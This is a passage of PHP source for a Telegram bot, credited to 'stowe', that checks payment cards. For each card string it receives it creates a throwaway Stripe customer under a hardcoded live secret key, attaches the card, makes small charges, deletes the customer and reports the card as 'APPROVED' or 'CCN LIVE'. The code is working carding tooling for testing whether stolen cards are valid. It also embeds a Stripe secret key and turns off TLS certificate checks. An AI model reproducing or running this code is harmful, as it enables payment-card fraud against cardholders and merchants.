  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=inr&customer='.$id.'');
  $result = curl_exec($ch);
  if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCHES! CHARGE 0.01₹ SUCCESSFUL!✅";
  $skresponse1 = "The CVC was sent and was correct | Risk score: Normal ";
}else{
  $skresult = "❌DECLINED!❌";
  $skresponse = "❌UNCHECKED CARD❌";
  $skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCH! AUTH ONLY✅";
  $skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
}
elseif(strpos($result, 'security code is incorrect')){
  $skresult = "✅APPROVED!";
  $skresponse = "CCN APPROVED!✅";
  $skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
}
elseif (isset($c["error"])){
  $skresult = "❌DECLINED!❌";
  $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
  $skresponse1 = " your card was declined, please try another card or contract your issuing bank";
}else{
  $skresult = "❌Error❌";
  $skresponse = "❌Unavailable to check cvc❌";
  $skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>💳 CARD:</u> <code>'.$lista.'</code>%0A<u>🔄 STATUS:</u> <b>'.$skresult.'</b>%0A<u>☑️ RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>ℹ️ EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A🔭 Checked By:</u> @'.$username.'<u>%0A⏳ Time Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
}
//////////=========[auth Command]=========//////////

elseif (strpos($message, "/aut") === 0){
    $lista = substr($message, 5);
    $i     = explode("|", $lista);
    $cc    = $i[0];
    $mon   = $i[1];
    $year  = $i[2];
    $year1 = substr($yyyy, 2, 4);
    $cvv   = $i[3];
    error_reporting(0);
    date_default_timezone_set('Asia/Jakarta');
    if ($_SERVER['REQUEST_METHOD'] == "POST"){
    extract($_POST);
    }
    elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
    extract($_GET);
    }
    function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mon = $separa[1];
    $year = $separa[2];
    $cvv = $separa[3];
    
    $skeys = array(
      1 => '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', // Enter at least one sk key
    //2 => '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',-----------------|
    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
    //4 => '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',                 |
    //5 => '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',-----------------|
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
    $f = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $id = trim(strip_tags(GetStr($f,'"id": "','"')));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $c = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
    $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
    if ($c["status"] == "succeeded"){ 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
    $result = curl_exec($ch);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
    $result = curl_exec($ch);
    $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $attachment_to_her;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
    $result = curl_exec($ch);
    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
    $skresult = "✅APPROVED!✅";
    $skresponse = "CVV MATCHES! ✅";
    $skresponse1 = "The CVC was sent and was correct";
  }else{
    $skresult = "❌DECLINED!❌";
    $skresponse = "❌UNCHECKED CARD❌";
    $skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
  }}
  elseif(strpos($result, '"cvc_check": "pass"')){
    $skresult = "✅APPROVED!✅";
    $skresponse = "CVV MATCH! OLD CVV✅";
    $skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
  }
  elseif(strpos($result, 'security code is incorrect')){
    $skresult = "✅APPROVED!";
    $skresponse = "CCN APPROVED!✅";
    $skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
  }
  elseif (isset($c["error"])){
    $skresult = "❌DECLINED!❌";
    $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
    $skresponse1 = "your card was declined, please try another card or contract your issuing bank";
  }else{
    $skresult = "❌Error❌";
    $skresponse = "❌Unavailable to check cvc❌";
    $skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
  };
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  
  sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
  }
  
  //////////=========[acn Command]=========//////////

elseif (strpos($message, "/acn") === 0){
    $lista = substr($message, 5);
    $i     = explode("|", $lista);
    $cc    = $i[0];
    $mon   = $i[1];
    $year  = $i[2];
    $year1 = substr($yyyy, 2, 4);
    $cvv   = $i[3];
    error_reporting(0);
    date_default_timezone_set('Asia/Jakarta');
    if ($_SERVER['REQUEST_METHOD'] == "POST"){
    extract($_POST);
    }
    elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
    extract($_GET);
    }
    function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mon = $separa[1];
    $year = $separa[2];
    $cvv = $separa[3];
    
    $skeys = array(
      1 => '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', // Enter at least one sk key
    //2 => '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',-----------------|
    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
    //4 => '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',                 |
    //5 => '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',-----------------|
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
    $f = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $id = trim(strip_tags(GetStr($f,'"id": "','"')));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'');
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $c = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
    $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
    if ($c["status"] == "succeeded"){ 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
    $result = curl_exec($ch);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
    $result = curl_exec($ch);
    $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $attachment_to_her;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=50&currency=usd&customer='.$id.'');
    $result = curl_exec($ch);
    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] = "null"){  
    $skresult = "✅APPROVED!✅";
    $skresponse = "CCN LIVE!✅";
    $skresponse1 = "Security code was not found or not provided However your card not chagred but live more information at: https://verifone.cloud/docs/2checkout/Documentation | Risk score: Unchecked - Not enabled ";
    }else{
    $skresult = "❌DECLINED!❌";
    $skresponse = "❌CARD SUS";
    }}
    elseif(strpos($result, '"cvc_check": "null"')){
    $skresult = "✅APPROVED!✅";
    $skresponse = "CCN LIVE! AUTH ONLY✅";
    }
    elseif(strpos($result, 'security code is incorrect')){
    $skresult = "✅APPROVED!";
    $skresponse = "CCN APPROVED!✅";
    }
    elseif (isset($c["error"])){
    $skresult = "❌DECLINED!❌";
    $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
    }else{
    $skresult = "❌Error❌";
    $skresponse = "Please try again later!";
    };
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_exec($ch);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_exec($ch);
    curl_close($ch);
    
    sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
    }
 //////////=========[cus Command]=========//////////


elseif (strpos($message, "/cus") === 0){
    $lista = substr($message, 5);
    $i     = explode("|", $lista);
    $cc    = $i[0];
    $mon   = $i[1];
    $year  = $i[2];
    $year1 = substr($yyyy, 2, 4);
    $cvv   = $i[3];
    $ammo  = $i[4];
    error_reporting(0);
    date_default_timezone_set('Asia/Jakarta');
    if ($_SERVER['REQUEST_METHOD'] == "POST"){
    extract($_POST);
    }
    elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
    extract($_GET);
    }
    function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mon = $separa[1];
    $year = $separa[2];
    $cvv = $separa[3];
    $ammo  = $separa[4];
    $skeys = array(
      1 => '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', // Enter at least one sk key
    //2 => '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',-----------------|
    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
    //4 => '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',                 |
    //5 => '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',-----------------|
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
    $f = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $id = trim(strip_tags(GetStr($f,'"id": "','"')));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded',));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $c = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
    $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
    if ($c["status"] == "succeeded"){ 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
    $result = curl_exec($ch);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
    $result = curl_exec($ch);
    $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $attachment_to_her;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
